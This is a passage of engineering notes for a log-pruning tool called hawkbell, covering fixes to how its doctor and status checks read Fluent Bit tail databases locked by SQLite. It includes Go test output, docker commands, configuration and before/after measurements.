
### Not measured

Outputs other than `http`; the `kubernetes.yaml` fragment; Fluent Bit
versions other than 5.2.0; head-of-line with a live writer rather than a
fixed backlog; a tail database lost while Fluent Bit was killed rather than
stopped.

## Fixes added 2026-11-12

A review of the section above found that `hawkbell doctor` warned about a
tail database the daemon reads. The pruner reads a database it cannot open
in place from a copy in its checkpoint directory (`readTailDB` in
`internal/daemon/taildb.go`); doctor's check (`daemon.CheckTailDB`) did not
have that fallback. `CheckTailDB` now takes a copy directory and does the
same read; doctor passes a temporary directory and removes it. This
section measures, with the same image
(`sha256:a48190bf67679495a332fd61025421a46e7e4d168380185a8e16da2e9acc3126`,
Fluent Bit v5.2.0), what `db.locking: true` does to that read, and shows
doctor before and after the change. Go 1.26.0, `NO_PROXY=localhost,127.0.0.1`.

### db.locking true against the shipped false

`TestFluentBitTailDBLocking`: the shipped inputs fragment, once as shipped
and once with both `db.locking: false` lines changed to `true`; 10
detection records delivered to a listening receiver; then
`hawkbell-findings.db` is read through `daemon.CheckTailDB` without a copy
directory (in place only) and with one.

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run TestFluentBitTailDBLocking -count=1 -v
=== RUN   TestFluentBitTailDBLocking/db.locking=false
    fluentbit_test.go:891: db.locking false: beside the database [hawkbell-findings.db-wal hawkbell-findings.db-shm]; in-place read: error <nil> (0.0 s); read with a copy directory: 1 segment row(s), error <nil>, in-place error <nil> (0.0 s)
=== RUN   TestFluentBitTailDBLocking/db.locking=true
    fluentbit_test.go:891: db.locking true: beside the database [hawkbell-findings.db-wal]; in-place read: error database is locked (5) (SQLITE_BUSY) (2.0 s); read with a copy directory: 1 segment row(s), error <nil>, in-place error database is locked (5) (SQLITE_BUSY) (2.0 s)
--- PASS: TestFluentBitTailDBLocking (8.58s)
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	8.582s
```

With `db.locking: true` Fluent Bit kept no `-shm` file and held the
database locked: the in-place read waited SQLite's 2 s busy timeout and
failed. A copy of the database and its `-wal` file read the segment's
row. With the shipped `db.locking: false` the in-place read worked at once.
The test asserts only the shipped case and that the copy read works; the
locked in-place failure is printed, not asserted.

### hawkbell doctor before and after, against a locked database

Fluent Bit ran with the shipped inputs fragment changed to
`db.locking: true`, `storage.path` set, a `null` output and one detection
segment in the outbox:

```
$ docker run -d --name hb-fix-lock --network none -v $F/lk/cfg:/cfg:ro -v $F/lk/outbox:/outbox:ro -v $F/lk/state:/state -e HAWKBELL_OUTBOX=/outbox -e HAWKBELL_FLB_DB=/state fluent/fluent-bit:latest /fluent-bit/bin/fluent-bit -c /cfg/main.yaml
$ ls $F/lk/state
hawkbell-activity.db
hawkbell-activity.db-wal
hawkbell-findings.db
hawkbell-findings.db-wal
storage
```

hawkbell's configuration named both databases with the recommended glob:

```yaml
data_dir: $F/lk/data
output:
  fluent_bit:
    tail_db: $F/lk/state/hawkbell-*.db
```

`hawkbell-before` was built from the tree before this fix, `hawkbell-after`
after it (both `CGO_ENABLED=0 go build ./cmd/hawkbell`). Each ran
`hawkbell doctor --config hawkbell.yaml --json` (exit 0); the status,
summary and detail of its `fluent_bit` check, printed from the report:

```
== before
warn | 2 Fluent Bit problem(s)
  shipper.tail_db: output.fluent_bit.tail_db: $F/lk/state/hawkbell-activity.db: database is locked (5) (SQLITE_BUSY); pruning counts nothing as read by it
  shipper.tail_db: output.fluent_bit.tail_db: $F/lk/state/hawkbell-findings.db: database is locked (5) (SQLITE_BUSY); pruning counts nothing as read by it
== after
ok | Fluent Bit settings are safe
$ ls /tmp | grep hawkbell-doctor || echo "no hawkbell-doctor-* left in /tmp"
no hawkbell-doctor-* left in /tmp
```

(`$F` is a scratch directory.) The before warnings were false: the pruner
reads both databases through its copy.

### The suite after the fix

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run FluentBit -count=1 -v -timeout 20m
--- PASS: TestFluentBitStreamsTagsAndTime (1.68s)
--- PASS: TestFluentBitRestartWithOutputDown (30.08s)
--- PASS: TestFluentBitHeadOfLine (110.50s)
--- PASS: TestFluentBitKeepsRejectedChunks (4.35s)
--- PASS: TestFluentBitHTTPStatus (123.06s)
--- PASS: TestFluentBitTailDBLoss (29.11s)
--- PASS: TestFluentBitTailDBLocking (8.01s)
--- PASS: TestFluentBitStorageMetricsStartup (39.70s)
--- PASS: TestFluentBitOversizeRecord (0.99s)
PASS
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	347.479s
```

Run from 20:40:31Z to 20:46:20Z. The counts matched the section above:
5,000 of 5,000 after SIGKILL and after a graceful stop, 0 of 5,000 for the
memory control; head-of-line 10 of 10 in every configuration except one
memory-buffered input with `mem_buf_limit 5M` behind 35 MB (0 of 10);
400, 401 and 413 dropped with a copy kept, 503 retried (6 requests,
`retries=5` this time) and delivered; 5,000 delivered again after the tail
databases were deleted, 0 with them kept; `/api/v1/storage` first answered
200 at 4.49 s (on) and 4.68 s (not set), never with it off.

### Not measured

A read-only mount of the tail databases (the other case the copy fallback
is for); how far behind a copy can be while Fluent Bit writes; `db.locking:
true` with Fluent Bit versions other than 5.2.0.

## Fixes added 2026-11-12, second pass

A review of the section above found that the run in "hawkbell doctor
before and after, against a locked database" checked only `/tmp` for
leftovers. Doctor reads every tail database a second time, outside its
`fluent_bit` check: `daemon.Status` (the `daemon` section of `--json`)
measures the outbox through `outboxStatus` in `internal/daemon/status.go`,
which built its consumers with `tailDBConsumers(spec, "")`. That function
joined the empty checkpoint directory with `taildb-copy`, so for a
database it could not read in place the status read created
`./taildb-copy` (mode 0700) in doctor's working directory and copied the
database into it. The copy was then opened at `/taildb-copy/...` (the
relative path became absolute in `sqliteURI`) and failed, so the status
also reported the consumer as unreadable. Now `tailDBConsumers` copies only
when it is given a checkpoint directory, and `outboxStatus` passes a
private directory from `os.MkdirTemp` that it removes before returning
(`TestStatusLockedTailDBNoCopyInWorkingDir` in
`internal/daemon/taildb_expand_test.go`).

The database was held by a Python `sqlite3` process instead of Fluent Bit,
with `PRAGMA journal_mode=WAL` and `PRAGMA locking_mode=EXCLUSIVE` and one
row written, which leaves the files Fluent Bit 5.2.0 left with
`db.locking: true` (a `-wal` file, no `-shm`; section above).
`hb-before` was built from the tree with the two functions as they were
(`go build -overlay`), `hb-after` from the tree with the fix (both
`CGO_ENABLED=0 go build ./cmd/hawkbell`). `$F` is a scratch directory and
`TMPDIR=$F/lk/tmp`. The lines after each `ls` are the number of entries
left in `TMPDIR` and the `fluent_bit` check and `daemon.outbox.consumers`
printed from the JSON report.

```
$ python3 -I lockdb.py $F/lk/state/hawkbell-findings.db 120 &
locked
$ ls $F/lk/state
hawkbell-findings.db
hawkbell-findings.db-wal
$ cat $F/lk/hawkbell.yaml
data_dir: $F/lk/data
output:
  fluent_bit:
    tail_db: $F/lk/state/hawkbell-*.db
$ cd $F/lk/cwd-before && hb-before doctor --config $F/lk/hawkbell.yaml --json > doctor-before.json
exit 0, took 4.07 s
$ ls -la $F/lk/cwd-before
drwx------ 2 root root 4096 Nov 12 22:53 taildb-copy
TMPDIR entries: 0
fluent_bit: ok | Fluent Bit settings are safe
daemon.outbox.consumers: readable false, error "database is locked (5) (SQLITE_BUSY) (copy: unable to open database file (14))"
$ cd $F/lk/cwd-after && hb-after doctor --config $F/lk/hawkbell.yaml --json > doctor-after.json
exit 0, took 4.07 s
$ ls -la $F/lk/cwd-after
(empty)
TMPDIR entries: 0
fluent_bit: ok | Fluent Bit settings are safe
daemon.outbox.consumers: readable true
```

With `hawkbell-activity.db` held the same way as well, `hb-after` took
8.10 s, left nothing in its working directory or in `TMPDIR`, and listed
both consumers as readable; without `tail_db` in the configuration it took
0.04 s. So each locked database costs SQLite's 2 s busy timeout twice, once
in the `fluent_bit` check and once in the status read.

The unit test, before the fix (the same test file, run against the old
`tailDBConsumers` and `outboxStatus`) and after:

```
$ go test -count=1 -run TestStatusLockedTailDBNoCopyInWorkingDir ./internal/daemon
--- FAIL: TestStatusLockedTailDBNoCopyInWorkingDir (2.02s)
    taildb_expand_test.go:180: consumer without a checkpoint directory copies into "taildb-copy"
    taildb_expand_test.go:188: status consumers: [{ID:fluent-bit:/tmp/TestStatusLockedTailDBNoCopyInWorkingDir952500194/001/hawkbell-findings.db Readable:false Error:database is locked (5) (SQLITE_BUSY) (copy: unable to open database file (14)) LagBytes:0}]
    taildb_expand_test.go:192: status left 1 entries in /tmp/TestStatusLockedTailDBNoCopyInWorkingDir952500194/002 (first taildb-copy)
FAIL
$ go test -count=1 -run TestStatusLockedTailDBNoCopyInWorkingDir -v ./internal/daemon
=== RUN   TestStatusLockedTailDBNoCopyInWorkingDir
--- PASS: TestStatusLockedTailDBNoCopyInWorkingDir (2.02s)
PASS
ok  	github.com/thomastysong/thomastysong/hawkbell/internal/daemon	2.027s
```

### Not measured

Fluent Bit itself holding the database for this pass (the section above
measured that it locks it the same way); a working directory another
account can write (the case where `./taildb-copy` could be a link planted
by that account), beyond the reviewer's report; Windows, where the status
read's temporary directory comes from `%TMP%`.
